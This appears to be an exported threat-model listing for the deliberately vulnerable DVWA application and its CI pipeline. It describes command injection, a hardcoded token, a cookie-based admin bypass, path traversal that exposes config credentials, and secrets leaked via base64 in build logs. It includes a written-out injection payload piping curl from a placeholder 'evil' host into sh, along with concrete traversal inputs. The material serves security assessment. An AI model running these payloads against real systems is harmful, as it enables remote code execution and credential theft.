g.title: Anonymous Internet Attacker no account or prior foothold Inject Input into Server Interpreters I send POST /vulnerabilities/api/v2/health/connectivity with JSON body {"target":"x; curl http://evil/s|sh"} and no credentials. C-03 · DVWA Web Application No account required Application data builds operating-system commands (W-001) Technical consequence not established. Service disruption or compromise of application data Disclosure of customer information

Anonymous Internet Attacker no account or prior foothold Bypass or Forge Authentication An unauthorized caller adds token=user_token to the profile request URL. The server compares it with a hardcoded constant and returns any user's profile. The denial message itself reveals the value, and the token also lands in URLs and logs. C-03 · DVWA Web Application No account required; Source-repository access required Secrets are committed to source instead of a managed store (W-007) Technical consequence not established. Unauthorized administration and changes to protected business data Disclosure of customer information

Anonymous Internet Attacker no account or prior foothold Bypass Authorization to Gain Access A non-admin or unauthenticated client sets Cookie security=low. change_user_details.php and get_user_data.php then skip their admin checks, because dvwaSecurityLevelGet returns the cookie value, so the client can read and modify all users' names. C-03 · DVWA Web Application No account required Authorization is implemented route by route (W-004) Technical consequence not established. Unauthorized administration and changes to protected business data

Anonymous Internet Attacker no account or prior foothold Access Exposed Data and Secrets At vulnerabilities/view_source.php:63, the id and security parameters are not validated. The switch on id only sets a label and does not reject unknown values. The only control is authentication. Any logged-in user can request view_source.php?id=fi&security=../../../config/config.inc. The server reads ../config/config.inc.php with file_get_contents and echoes its source through highlight_string. This discloses any .php file the server can read, including configuration that holds database credentials. One part says JS files can also be read this way. C-03 · DVWA Web Application No account required Input handling lacks enforced boundary validation (W-003) Technical consequence not established. Disclosure of customer information

Supply-Chain / Build Attacker 1 role; access details in Identified Actors Compromise the Build or Its Inputs On every push to master the get_secrets job serialises all repository secrets via toJSON(secrets) into ALLMYSECRETS and echoes it through base64. GitHub log masking only matches the literal secret values, so the encoded blob is shown in clear. Anyone able to read the Actions logs (any user if the repository is public) decodes it and obtains every secret, including DVWA_SECRET_KEY and the run's GITHUB_TOKEN. C-02 · CI/CD Pipeline Build or dependency access required All repository secrets dumped base64-encoded to workflow logs (W-014) Technical consequence not established. Disclosure of customer information
g.text: Compromise the Build or Its Inputs
